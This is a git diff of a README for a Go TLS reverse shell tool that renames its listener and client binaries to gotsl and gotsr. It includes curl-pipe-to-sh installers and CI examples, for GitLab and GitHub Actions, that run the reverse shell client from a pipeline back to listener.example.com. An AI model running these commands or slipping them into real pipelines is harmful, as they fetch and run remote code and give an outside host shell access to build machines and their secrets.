@@ -10,8 +10,8 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
 
 ## Install
 - Binstaller (recommended):
-  - Listener: `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-listener.sh | sh`
-  - Reverse:  `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh`
+  - gotsl (Listener): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsl.sh | sh`
+  - gotsr (Reverse): `curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh`
   - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).
 
 - From source:
@@ -22,20 +22,20 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
   ```
 
 ## Usage
-- Start listener (TLS, self-signed):
+- Start gotsl (Listener, TLS, self-signed):
   ```bash
-  ./listener <port> <bind-ip>
+  ./gotsl <port> <bind-ip>
   ```
-- Start client:
+- Start gotsr (Reverse shell client):
   ```bash
-  ./reverse <host:port> <max-retries>
+  ./gotsr <host:port> <max-retries>
   ```
-- Core listener commands: `list`, `use <client>`, `exit`.
+- Core gotsl commands: `list`, `use <client>`, `exit`.
 - In a session: run shell commands; `background` to return.
 
 ## Notes
 - Protocol: TLS 1.2+ over TCP only (no HTTP).
-- Defaults to self-signed cert generation on the listener.
+- Defaults to self-signed cert generation on the gotsl (listener).
 
 ## CI examples
 - GitLab CI (`.gitlab-ci.yml`):
@@ -46,8 +46,8 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
     image: alpine:3.19
     script:
       - apk add --no-cache curl
-      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh
-      - ~/.local/bin/reverse listener.example.com:8443 3
+      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
+      - ~/.local/bin/gotsr listener.example.com:8443 3
   ```
 
 - GitHub Actions:
@@ -58,8 +58,8 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
     run-reverse:
       runs-on: ubuntu-latest
       steps:
-        - name: Install reverse client
-          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install-reverse.sh | sh
-        - name: Run reverse
-          run: ~/.local/bin/reverse listener.example.com:8443 3
+        - name: Install gotsr client
+          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install-gotsr.sh | sh
+        - name: Run gotsr
+          run: ~/.local/bin/gotsr listener.example.com:8443 3
   ```
